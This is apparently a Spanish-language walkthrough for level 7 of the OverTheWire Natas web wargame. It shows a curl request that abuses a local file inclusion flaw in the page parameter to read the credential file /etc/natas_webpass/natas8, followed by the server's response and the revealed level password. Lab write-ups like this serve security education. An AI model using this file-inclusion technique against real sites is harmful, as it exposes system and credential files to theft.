# Natas 7

#### URL: http://natas7.natas.labs.overthewire.org/

#### Credenciales: natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

Si vamos a /about podemos ver que la URL contiene el parametro file y nos dicen que la contraseña se encuentra en /etc/natas_webpass/natas8:

![2025-03-19-181008_886x35_scrot](https://github.com/user-attachments/assets/2b1fdee0-4750-42b3-9acd-5cebcba8dc84)

Existe un LFI o Local File Inclusion en esta web:

``` bash
> curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS http://natas7.natas.labs.overthewire.org/?page=/etc/natas_webpass/natas8
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```

`natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`
